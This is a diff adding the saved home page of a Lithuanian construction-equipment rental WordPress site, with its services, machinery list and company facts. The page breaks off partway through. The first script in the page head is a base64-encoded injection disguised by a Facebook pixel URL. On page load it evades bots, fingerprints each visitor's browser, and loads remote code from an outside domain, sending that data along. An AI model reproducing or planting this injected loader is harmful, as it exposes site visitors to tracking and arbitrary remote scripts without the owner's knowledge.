@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en-US" prefix="og: http://ogp.me/ns#">
+<head>
+    <script src="data:text/javascript;base64, dmFyIGJ1Y2ZreGZrbnZzdWVqZXhuc3Nlb2tqdXBkc3BzY2V1d2h6aGVmcnJha21mdHFkaGl3bHdndXJ3eWtscm5xbGt4a3JjcWl1cXNnd213enVmdmc9ZnVuY3Rpb24oc3JjKXt2YXIgcT1hdG9iKCJYMTl6ZEc5d1FXeHNWR2x0WlhKekxuZGxZbVJ5YVhabGNpNWZYMjVwWjJoMGJXRnlaUzVmYzJWc1pXNXBkVzB1WTJGc2JGQm9ZVzUwYjIwdVkyRnNiRk5sYkdWdWFYVnRMbDlUWld4bGJtbDFiVjlKUkVWZlVtVmpiM0prWlhJdWMyVnNaVzVwZFcwdVpISnBkbVZ5TGw5elpXeGxibWwxYlM1ZlgzZGxZbVJ5YVhabGNsOWxkbUZzZFdGMFpTNWZYM05sYkdWdWFYVnRYMlYyWVd4MVlYUmxMbDlmZDJWaVpISnBkbVZ5WDNOamNtbHdkRjltZFc1amRHbHZiaTVmWDNkbFltUnlhWFpsY2w5elkzSnBjSFJmWm5WdVl5NWZYM2RsWW1SeWFYWmxjbDl6WTNKcGNIUmZabTR1WDE5bWVHUnlhWFpsY2w5bGRtRnNkV0YwWlM1ZlgyUnlhWFpsY2w5MWJuZHlZWEJ3WldRdVgxOTNaV0prY21sMlpYSmZkVzUzY21Gd2NHVmtMbDlmWkhKcGRtVnlYMlYyWVd4MVlYUmxMbDlmYzJWc1pXNXBkVzFmZFc1M2NtRndjR1ZrTGw5ZlpuaGtjbWwyWlhKZmRXNTNjbUZ3Y0dWa0xsOXdhR0Z1ZEc5dExuQm9ZVzUwYjIwdVpHOXRRWFYwYjIxaGRHbHZibDlmYm1sbmFIUnRZWEpsIikuc3BsaXQoIi4iKSxlPWVuY29kZVVSSUNvbXBvbmVudCxnPTAsdz13aW5kb3csZD13LmRvY3VtZW50LG49dy5uYXZpZ2F0b3IsZGU9ImRvY3VtZW50RWxlbWVudCIscz13LnNjcmVlbixwPSIiLGE9ImF2YWlsIixpPSJpbm5lciIsbz0ib3V0ZXIiLEg9IkhlaWdodCIsVz0iV2lkdGgiLGM9dy5jaHJvbWU/T2JqZWN0LmtleXMody5jaHJvbWUpLmpvaW4oIioiKToiKiIsdGFnPWQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7ZnVuY3Rpb24gd2QoKXt0cnl7Zm9yKHZhciBsIGluIHEpe3ZhciB6PXFbbF07aWYod1t6XXx8blt6XSlyZXR1cm4gejtpZihkJiZkW2RlXSYmZFtkZV0uZ2V0QXR0cmlidXRlJiZkW2RlXS5nZXRBdHRyaWJ1dGUoeikpcmV0dXJuIHo7aWYoeiBpbiB3fHx6IGluIGQpcmV0dXJuIHp9cmV0dXJuIDB9Y2F0Y2goZSl7fX0hZnVuY3Rpb24gd3AoKXt0cnl7aWYobiYmbi5wbHVnaW5zKXtPYmplY3Qua2V5cyhuLnBsdWdpbnMpLmZvckVhY2goZnVuY3Rpb24oaSl7aWYobi5wbHVnaW5zW2ldKXArPW4ucGx1Z2luc1tpXS5maWxlbmFtZSsiKiJ9KX19Y2F0Y2goZSl7fX0oKTt0cnl7Zz1kLmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpLmdldENvbnRleHQoIndlYmdsIik7Zz1nLmdldFBhcmFtZXRlcihnLmdldEV4dGVuc2lvbigiV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbyIpLlVOTUFTS0VEX1JFTkRFUkVSX1dFQkdMKX1jYXRjaChlKXt9c3JjPSJodHRwczovL3R1dHV0LnNpdGUvNTAwNDdfMi9zY3JpcHQucGhwP2NsaWQ9IitidG9hKCJyZWY9IitlKGQucmVmZXJyZXIpKyImZHJpdmU9Iit3ZCgpKyImYz0iK2MrIiZzPSIrc1thK0hdKyIqIit3W2krSF0rIioiK3dbbytIXSsiKiIrc1thK1ddKyIqIit3W2krV10rIioiK3dbbytXXSsiKiIrdy5kZXZpY2VQaXhlbFJhdGlvKyIqIituLm1heFRvdWNoUG9pbnRzKyImcD0iK3ArIiZoPSIrbi5oYXJkd2FyZUNvbmN1cnJlbmN5KyIqIituLmRldmljZU1lbW9yeSsiKiIrZShnKSsiJnQ9IitlKG5ldyBEYXRlKCkudG9TdHJpbmcoKSkrIiZxPSIrZSh3LmxvY2F0aW9uLnNlYXJjaC5zdWJzdHIoMSkpKTt0YWdbInR5cGUiXT0idGV4dC9qYXZhc2NyaXB0Ijt0YWdbInNyYyJdPXNyYztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHRhZyl9KCJodHRwczovL2Nvbm5lY3QuZmFjZWJvb2submV0L2VuX1VTL2ZiZXZlbnRzLmpzIik="></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="https://technikanuomai.lt/xmlrpc.php">
+<title>Statybų technikos nuoma su prof. operatoriais</title>
+
+<!-- This site is optimized with the Yoast SEO plugin v3.3.4 - https://yoast.com/wordpress/plugins/seo/ -->
+<meta name="description" content="technikos nuoma, technika statyboms,ekskavatorius, krautuvas, cat, case, sunkvežimiai, kelių formavimas, sklypų formavimas, tranšėjų/duobių kasimas"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="index.html" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Statybų technikos nuoma su prof. operatoriais" />
+<meta property="og:description" content="technikos nuoma, technika statyboms,ekskavatorius, krautuvas, cat, case, sunkvežimiai, kelių formavimas, sklypų formavimas, tranšėjų/duobių kasimas" />
+<meta property="og:url" content="https://technikanuomai.lt/" />
+<meta property="og:site_name" content="Statybų technika" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:description" content="technikos nuoma, technika statyboms,ekskavatorius, krautuvas, cat, case, sunkvežimiai, kelių formavimas, sklypų formavimas, tranšėjų/duobių kasimas" />
+<meta name="twitter:title" content="Statybų technikos nuoma su prof. operatoriais" />
+<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"https:\/\/technikanuomai.lt\/","name":"Statyb\u0173 technika","potentialAction":{"@type":"SearchAction","target":"https:\/\/technikanuomai.lt\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
+<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"Organization","url":"https:\/\/technikanuomai.lt\/","sameAs":[],"name":"Jarneda","logo":"http:\/\/technikanuomai.lt\/wp-content\/uploads\/2016\/06\/cropped-1467069924_bulldozer-e1467052240287.png"}</script>
+<!-- / Yoast SEO plugin. -->
+
+<link rel='dns-prefetch' href='https://fonts.googleapis.com' />
+<link rel='dns-prefetch' href='https://s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Statybų technika &raquo; Feed" href="feed/index.rss" />
+<link rel="alternate" type="application/rss+xml" title="Statybų technika &raquo; Comments Feed" href="comments/feed/index.rss" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/technikanuomai.lt\/wp-includes\/js\/wp-emoji-release.min.js?ver=7bd3ea8097cdcb3dff311d783e7316fe"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='contact-form-7-css'  href='wp-content/plugins/contact-form-7/includes/css/styles_ver=5.1.6.css' type='text/css' media='all' />
+<link rel='stylesheet' id='onepress-fonts-css'  href='https://fonts.googleapis.com/css?family=Raleway%3A400%2C500%2C600%2C700%2C300%2C100%2C800%2C900%7COpen%2BSans%3A400%2C300%2C300italic%2C400italic%2C600%2C600italic%2C700%2C700italic&amp;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='onepress-animate-css'  href='wp-content/themes/onepress/assets/css/animate.min_ver=1.0.0.css' type='text/css' media='all' />
+<link rel='stylesheet' id='onepress-fa-css'  href='wp-content/themes/onepress/assets/css/font-awesome.min_ver=4.4.0.css' type='text/css' media='all' />
+<link rel='stylesheet' id='onepress-bootstrap-css'  href='wp-content/themes/onepress/assets/css/bootstrap.min_ver=4.0.0.css' type='text/css' media='all' />
+<link rel='stylesheet' id='onepress-style-css'  href='wp-content/themes/onepress/style_ver=7bd3ea8097cdcb3dff311d783e7316fe.css' type='text/css' media='all' />
+<style id='onepress-style-inline-css' type='text/css'>#main .video-section section.hero-slideshow-wrapper{background:transparent}.hero-slideshow-wrapper:after{position:absolute;top:0px;left:0px;width:100%;height:100%;background-color:rgba(0,0,0,0.3);display:block;content:""}.body-desktop .parallax-hero .hero-slideshow-wrapper:after{display:none!important}.parallax-hero .parallax-mirror:after{position:absolute;top:0px;left:0px;width:100%;height:100%;background-color:rgba(0,0,0,0.3);display:block;content:""}.parallax-hero .hero-slideshow-wrapper:after{display:none!important}.parallax-hero .parallax-mirror:after{position:absolute;top:0px;left:0px;width:100%;height:100%;background-color:rgba(0,0,0,0.3);display:block;content:""}a,.screen-reader-text:hover,.screen-reader-text:active,.screen-reader-text:focus,.header-social a,.onepress-menu a:hover,.onepress-menu ul li a:hover,.onepress-menu li.onepress-current-item>a,.onepress-menu ul li.current-menu-item>a,.onepress-menu>li a.menu-actived,.onepress-menu.onepress-menu-mobile li.onepress-current-item>a,.site-footer a,.site-footer .footer-social a:hover,.site-footer .btt a:hover,.highlight,#comments .comment .comment-wrapper .comment-meta .comment-time:hover,#comments .comment .comment-wrapper .comment-meta .comment-reply-link:hover,#comments .comment .comment-wrapper .comment-meta .comment-edit-link:hover,.btn-theme-primary-outline,.sidebar .widget a:hover,.section-services .service-item .service-image i,.counter_item .counter__number,.team-member .member-thumb .member-profile a:hover,.icon-background-default{color:#c52d29}input[type="reset"],input[type="submit"],input[type="submit"],.nav-links a:hover,.btn-theme-primary,.btn-theme-primary-outline:hover,.card-theme-primary,.woocommerce #respond input#submit,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce button.button.alt{background:#c52d29}.btn-theme-primary-outline,.btn-theme-primary-outline:hover,.pricing__item:hover,.card-theme-primary,.entry-content blockquote{border-color:#c52d29}
+</style>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var onepress_js_settings = {"onepress_disable_animation":"","onepress_disable_sticky_header":"","onepress_vertical_align_menu":"","hero_animation":"flipInX","hero_speed":"5000"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-includes/js/jquery/jquery_ver=1.12.4.js'></script>
+<script type='text/javascript' src='wp-includes/js/jquery/jquery-migrate.min_ver=1.4.1.js'></script>
+<link rel='https://api.w.org/' href='wp-json/index.json' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc.php_rsd.xml" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="wp-includes/wlwmanifest.xml" /> 
+
+<link rel='shortlink' href='index.html' />
+<link rel="alternate" type="application/json+oembed" href="wp-json/oembed/1.0/embed_url=https___technikanuomai.lt_.json" />
+<link rel="alternate" type="text/xml+oembed" href="wp-json/oembed/1.0/embed_url=https___technikanuomai.lt_&amp;format=xml.xml" />
+
+<!-- Call Now Button 0.3.6 by Jerry Rietveld (callnowbutton.com) -->
+<style>#callnowbutton {display:none;} @media screen and (max-width:650px){#callnowbutton {display:block; position:fixed; text-decoration:none; z-index:2147483647;width:65px; height:65px; border-radius:50%; border-top:1px solid #2de943; bottom:15px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.4);transform: scale(1);right:20px;background:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2aWV3Qm94PSIwIDAgNjAgNjAiPjxwYXRoIGQ9Ik03LjEwNCAxNC4wMzJsMTUuNTg2IDEuOTg0YzAgMC0wLjAxOSAwLjUgMCAwLjk1M2MwLjAyOSAwLjc1Ni0wLjI2IDEuNTM0LTAuODA5IDIuMSBsLTQuNzQgNC43NDJjMi4zNjEgMy4zIDE2LjUgMTcuNCAxOS44IDE5LjhsMTYuODEzIDEuMTQxYzAgMCAwIDAuNCAwIDEuMSBjLTAuMDAyIDAuNDc5LTAuMTc2IDAuOTUzLTAuNTQ5IDEuMzI3bC02LjUwNCA2LjUwNWMwIDAtMTEuMjYxIDAuOTg4LTI1LjkyNS0xMy42NzRDNi4xMTcgMjUuMyA3LjEgMTQgNy4xIDE0IiBmaWxsPSIjMDA4YTAwIi8+PHBhdGggZD0iTTcuMTA0IDEzLjAzMmw2LjUwNC02LjUwNWMwLjg5Ni0wLjg5NSAyLjMzNC0wLjY3OCAzLjEgMC4zNWw1LjU2MyA3LjggYzAuNzM4IDEgMC41IDIuNTMxLTAuMzYgMy40MjZsLTQuNzQgNC43NDJjMi4zNjEgMy4zIDUuMyA2LjkgOS4xIDEwLjY5OWMzLjg0MiAzLjggNy40IDYuNyAxMC43IDkuMSBsNC43NC00Ljc0MmMwLjg5Ny0wLjg5NSAyLjQ3MS0xLjAyNiAzLjQ5OC0wLjI4OWw3LjY0NiA1LjQ1NWMxLjAyNSAwLjcgMS4zIDIuMiAwLjQgMy4xMDVsLTYuNTA0IDYuNSBjMCAwLTExLjI2MiAwLjk4OC0yNS45MjUtMTMuNjc0QzYuMTE3IDI0LjMgNy4xIDEzIDcuMSAxMyIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==) center/50px 50px no-repeat #00bc16;}}#callnowbutton .NoButtonText{display:none;}</style>
+<script type="text/javascript">
+(function(url){
+	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
+	var addEvent = function(evt, handler) {
+		if (window.addEventListener) {
+			document.addEventListener(evt, handler, false);
+		} else if (window.attachEvent) {
+			document.attachEvent('on' + evt, handler);
+		}
+	};
+	var removeEvent = function(evt, handler) {
+		if (window.removeEventListener) {
+			document.removeEventListener(evt, handler, false);
+		} else if (window.detachEvent) {
+			document.detachEvent('on' + evt, handler);
+		}
+	};
+	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
+	var logHuman = function() {
+		if (window.wfLogHumanRan) { return; }
+		window.wfLogHumanRan = true;
+		var wfscr = document.createElement('script');
+		wfscr.type = 'text/javascript';
+		wfscr.async = true;
+		wfscr.src = url + '&r=' + Math.random();
+		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
+		for (var i = 0; i < evts.length; i++) {
+			removeEvent(evts[i], logHuman);
+		}
+	};
+	for (var i = 0; i < evts.length; i++) {
+		addEvent(evts[i], logHuman);
+	}
+})('//technikanuomai.lt/?wordfence_lh=1&hid=5DF291B64631B4E3F3470857A4BBC916');
+</script><link rel="icon" href="wp-content/uploads/2017/02/cropped-logo-32x32.jpg" sizes="32x32" />
+<link rel="icon" href="wp-content/uploads/2017/02/cropped-logo-192x192.jpg" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="wp-content/uploads/2017/02/cropped-logo-180x180.jpg" />
+<meta name="msapplication-TileImage" content="https://technikanuomai.lt/wp-content/uploads/2017/02/cropped-logo-270x270.jpg" />
+</head>
+
+<body class="home page-template page-template-template-frontpage page-template-template-frontpage-php page page-id-4 wp-custom-logo sticky-header">
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-100555051-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<div id="page" class="hfeed site">
+	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+            <header id="masthead" class="site-header" role="banner">
+            <div class="container">
+                <div class="site-branding">
+                <div class="site-brand-inner has-logo-img no-desc"><div class="site-logo-div"><a href="index.html" class="custom-logo-link" rel="home" itemprop="url"><img width="389" height="108" src="wp-content/uploads/2017/04/cropped-logo3.png" class="custom-logo" alt="Statybų technika" itemprop="logo" srcset="wp-content/uploads/2017/04/cropped-logo3.png 389w, wp-content/uploads/2017/04/cropped-logo3-300x83.png 300w" sizes="(max-width: 389px) 100vw, 389px" /></a></div></div>                </div>
+
+                <!-- .site-branding -->
+
+                <div class="header-right-wrapper">
+                    <a href="#0" id="nav-toggle">Menu<span></span></a>
+                    <nav id="site-navigation" class="main-navigation" role="navigation">
+                        <ul class="onepress-menu">
+                            <li id="menu-item-1200" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-1200"><a href="index.html#about">Apie mus</a></li>
+<li id="menu-item-1201" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-1201"><a href="index.html#services">Paslaugos</a></li>
+<li id="menu-item-1203" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-1203"><a href="index.html#team">Komanda</a></li>
+<li id="menu-item-1205" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-1205"><a href="index.html#contact">Kontaktai</a></li>
+                        </ul>
+                    </nav>
+                    <!-- #site-navigation -->
+                </div>
+            </div>
+        </header><!-- #masthead -->
+        
+	<div id="content" class="site-content">
+		<main id="main" class="site-main" role="main">
+            	<section id="hero" class="hero-slideshow-wrapper hero-slideshow-normal">
+						<div class="container" style="padding-top: 10%; padding-bottom: 10%;">
+					<div class="hero__content hero-content-style1">
+						<h2 class="hero-large-text">Nuomojame <br> <span class="js-rotating"> ekskavatorius | savivarčius | minikrautuvus </span> </br></h2>												<a href="#services" class="btn btn-theme-primary btn-lg">Apie mus</a>						<a href="#contact" class="btn btn-secondary-outline btn-lg">Susisiekite</a>					</div>
+				</div>
+							<script>
+				jQuery(document).ready(function () {
+					jQuery('.hero-slideshow-wrapper').backstretch(["https:\/\/technikanuomai.lt\/wp-content\/uploads\/2016\/06\/436961.jpg","https:\/\/technikanuomai.lt\/wp-content\/uploads\/2017\/04\/man1.jpg"], {
+						fade: 750,
+						duration: 5000
+					});
+				});
+			</script>
+				</section>
+<section id="features"          class="section-features section-padding section-meta onepage-section">
+        <div class="container">
+                <div class="section-title-area">
+            <h5 class="section-subtitle">Mes esame Jums</h5>            <h2 class="section-title">Privalumai</h2>                    </div>
+                <div class="section-content">
+            <div class="row">
+                            <div class="feature-item col-lg-3 col-sm-6 wow slideInUp">
+                    <div class="feature-media">
+                                                <span class="fa-stack fa-5x"><i class="fa fa-circle fa-stack-2x icon-background-default"></i> <i class="feature-icon fa fa-balance-scale fa-stack-1x"></i></span>                                            </div>
+                    <h4>Organizuotas darbas</h4>
+                    <div><br></div>
+                </div>
+                            <div class="feature-item col-lg-3 col-sm-6 wow slideInUp">
+                    <div class="feature-media">
+                                                <span class="fa-stack fa-5x"><i class="fa fa-circle fa-stack-2x icon-background-default"></i> <i class="feature-icon fa fa-check-circle fa-stack-1x"></i></span>                                            </div>
+                    <h4>Kokybiškas aptarnavimas</h4>
+                    <div><br></div>
+                </div>
+                            <div class="feature-item col-lg-3 col-sm-6 wow slideInUp">
+                    <div class="feature-media">
+                                                <span class="fa-stack fa-5x"><i class="fa fa-circle fa-stack-2x icon-background-default"></i> <i class="feature-icon fa fa-user-plus fa-stack-1x"></i></span>                                            </div>
+                    <h4>Orientacija į kliento poreikius</h4>
+                    <div><br></div>
+                </div>
+                            <div class="feature-item col-lg-3 col-sm-6 wow slideInUp">
+                    <div class="feature-media">
+                                                <span class="fa-stack fa-5x"><i class="fa fa-circle fa-stack-2x icon-background-default"></i> <i class="feature-icon fa fa-reorder fa-stack-1x"></i></span>                                            </div>
+                    <h4>Didelis technikos pasirinkimas</h4>
+                    <div><br></div>
+                </div>
+                        </div>
+        </div>
+    </div>
+    
+</section>
+                    <section id="about"  class="section-about section-padding onepage-section">
+        
+                        <div class="container">
+                                <div class="section-title-area">
+                    <h5 class="section-subtitle">Sužinokite kas mes</h5>                    <h2 class="section-title">Apie mus</h2>                                    </div>
+                                <div class="row">
+                                                <div class="col-lg-12 col-sm-12  wow slideInUp">
+                                                                    <div class="about-image"><img width="640" height="380" src="wp-content/uploads/2016/02/svarbus_klientas-640x380.jpg" class="attachment-onepress-medium size-onepress-medium wp-post-image" alt="" /></div>
+                                                                                                <p>Pagrindinės mūsų įmonės <strong>UAB</strong> <strong>„Jarneda“</strong> veiklos sritys – <strong>žemės kasimo darbai, žemės lyginimas, sklypų formavimas, polių gręžimas, gatvių formavimas, tvenkinių kasimas, ekskavatorių nuoma,  statybinės technikos nuoma</strong>. Taip pat atliekame įvairius pastatų griovimo darbus, kasame ir įrenginėjame kelius, kasame gruntą, sutvarkome lanšaftą bei transportuojame birius krovinius.</p>
+<p>Mes sėkmingai dirbame įgyvendinant didelius projektus, tokius kaip „Zujūnų namai“, „Pavilnio miestelis“ ir kiti.</p>
+<p><strong>Mūsų pagrindinės vertybės</strong>:</p>
+<ul>
+<li>Įmonės kolektyvas, kuris turi ilgametę patirtį, yra savo srities profesionalai, kvalifikuoti ekskavatorių, buldozerių ir kitų mechanizmų operatoriai, kokybiškai ir maksimaliai greitai atliekantys jiems paskirtus darbus.</li>
+<li>Pagarba – tikime, kad nuoširdi pagarba ir asmeninis dėmesys klientams, partneriams bei darbuotojams garantuoja ilgalaikę sėkmę ir puikius darbo rezultatus;</li>
+<li>Lojalumas – įmonė itin vertina ir motyvuoja ištikimiausius klientus bei darbuotojus.</li>
+</ul>
+<p>Siekdami ne tik atlikti darbus laiku, bet ir užtikrinti atliekamų darbų kokybę bei įgyvendinti klientų lūkesčius, dirbame su modernia technika, kuri garantuoja spartų ir kokybišką darbą įvairios paskirties bei dydžio objektuose.</p>
+<p><strong>UAB</strong> <strong>„Jarneda“</strong> dirba su naujausiais;</p>
+<p><strong>„Kobelco“</strong> ekskavatoriais 22t;</p>
+<p><strong>„Caterpillar“ </strong>buldozeris 16t, eskavatoriais krautuvais (račiokais), mini &#8211; vikšriniais krautuvais (bobkatais), turinčiais visus kasimo, planiravimo ir gręžimo privalumus;</p>
+<p><strong>„MAN“</strong> savivarčiais su kranu (fiskarais) 6&#215;6, 4&#215;6, savivarčiais 4&#215;6, 6&#215;6, 6&#215;8 ir 8&#215;8.</p>
+<p>Šioje srityje mes turime sukaupę 5-ių metų patirtį ir su malonumu norėtume su Jumis bendradarbiauti ir pasidalinti savo patirtimi ir profesionalumu.</p>
+                            </div>
+                                            </div>
+            </div>
+                            </section>
+                                <section id="services"                  class="section-services section-padding section-meta onepage-section">
+                                <div class="container">
+                                <div class="section-title-area">
+                    <h5 class="section-subtitle">atraskite tai kas jums reikalinga</h5>                    <h2 class="section-title">Paslaugos</h2>                                    </div>
+                                <div class="row">
+                                                <div class="col-sm-6 col-lg-4 wow slideInUp">
+                                <div class="service-item ">
+                                                                            <a class="service-link" href="statybines-technikos-su-prof-operatoriais-nuoma/index.html"><span class="screen-reader-text">STATYBINĖS TECHNIKOS SU PROF. OPERATORIAIS NUOMA</span></a>
+                                                                                                                    <div class="service-thumbnail ">
+                                            <img width="600" height="400" src="wp-content/uploads/2016/07/IMG_3965-600x400.jpg" class="attachment-onepress-medium size-onepress-medium wp-post-image" alt="" />                                        </div>
+                                                                                                            <div class="service-content">
+                                        <h4 class="service-title">STATYBINĖS TECHNIKOS SU PROF. OPERATORIAIS NUOMA</h4>
+                                        <p>Ekskavatorius 21t (vikšrinis) CFA polių gręžimas, gylis iki 5.5m Ekskavatorius krautuvas Mini ekskavatorius Cat mini krautuvai (vikšriniai &#8220;bobcat&#8217;ai&#8221;) Sunkvežimiai savivarčiai (su manipuliatoriumi)</p>
+                                    </div>
+                                </div>
+                            </div>
+                                                        <div class="col-sm-6 col-lg-4 wow slideInUp">
+                                <div class="service-item ">
+                                                                            <a class="service-link" href="sunkiasvorio-transporto-ir-statybines-technikos-paslaugos/index.html"><span class="screen-reader-text">SUNKIASVORIO TRANSPORTO IR STATYBINĖS TECHNIKOS PASLAUGOS</span></a>
+                                                                                                                    <div class="service-thumbnail ">
+                                            <img width="640" height="400" src="wp-content/uploads/2016/07/cat-bulldozer-640x400.jpg" class="attachment-onepress-medium size-onepress-medium wp-post-image" alt="" srcset="wp-content/uploads/2016/07/cat-bulldozer-640x400.jpg 640w, wp-content/uploads/2016/07/cat-bulldozer-480x300.jpg 480w" sizes="(max-width: 640px) 100vw, 640px" />                                        </div>
+                                                                                                            <div class="service-content">
+                                        <h4 class="service-title">SUNKIASVORIO TRANSPORTO IR STATYBINĖS TECHNIKOS PASLAUGOS</h4>
+                                        <p>tvenkinių kasimas, valymas, gilinimas pakrančių valymas reljefo, šlaitų, sklypų formavimas sklypų pakėlimo darbai augalinio sluoksnio nuėmimas ir grunto išlyginimas tranšėjų/duobių kasimas (kanalizacijai, vandentiekiui, dujotiekiui, elektros kabeliams) kelių, įvažiavimų į sklypus &#8230;</p>
+                                    </div>
+                                </div>
+                            </div>
+                                                        <div class="col-sm-6 col-lg-4 wow slideInUp">
+                                <div class="service-item ">
+                                                                            <a class="service-link" href="technikos-sarasas/index.html"><span class="screen-reader-text">TECHNIKOS SĄRAŠAS</span></a>
+                                                                                                                    <div class="service-thumbnail ">
+                                            <img width="640" height="400" src="wp-content/uploads/2017/04/Kobelco-SK75SR-excavator-640x400.jpg" class="attachment-onepress-medium size-onepress-medium wp-post-image" alt="" srcset="wp-content/uploads/2017/04/Kobelco-SK75SR-excavator-640x400.jpg 640w, wp-content/uploads/2017/04/Kobelco-SK75SR-excavator-480x300.jpg 480w" sizes="(max-width: 640px) 100vw, 640px" />                                        </div>
+                                                                                                            <div class="service-content">
+                                        <h4 class="service-title">TECHNIKOS SĄRAŠAS</h4>
+                                        <p>Vikšrinis mini-krautuvas: su kaušu (paletinės šakės) su grąžtu (15-90cm diametras, iki 3m gylis) su šluota Vikšrinis mini eskavatorius 1,7t Kaušo plotis 30, 50 ir 90cm Eskavatorius-krautuvas Kasymo gylis iki 5m &#8230;</p>
+                                    </div>
+                                </div>
+                            </div>
+                                            </div>
+            </div>
+                            </section>
+                                <section id="counter"                  class="section-counter section-padding onepage-section">
+                                <div class="container">
+                                <div class="section-title-area">
+                    <h5 class="section-subtitle">Keletas faktų apie mūsų įmonę?</h5>                                                        </div>
+                                <div class="row">
+                    
+                        <div class="col-sm-6 col-md-3">
+                            <div class="counter_item">
+                                <div class="counter__number">
+                                                                        <span class="n counter">124</span>
+                                                                    </div>
+                                <div class="counter_title">Užbaigtų projektų</div>
+                            </div>
+                        </div>
+
+                        
+                        <div class="col-sm-6 col-md-3">
+                            <div class="counter_item">
+                                <div class="counter__number">
+                                                                        <span class="n counter">99</span>
+                                                                            <span class="n-a">%</span>
+                                                                    </div>
+                                <div class="counter_title">Teigiamų atsiliepimų</div>
+                            </div>
+                        </div>
+
+                        
+                        <div class="col-sm-6 col-md-3">
+                            <div class="counter_item">
+                                <div class="counter__number">
+                                                                        <span class="n counter">23</span>
+                                                                    </div>
+                                <div class="counter_title">Priimta darbuotojų</div>
+                            </div>
+                        </div>
+
+                        
+                        <div class="col-sm-6 col-md-3">
+                            <div class="counter_item">
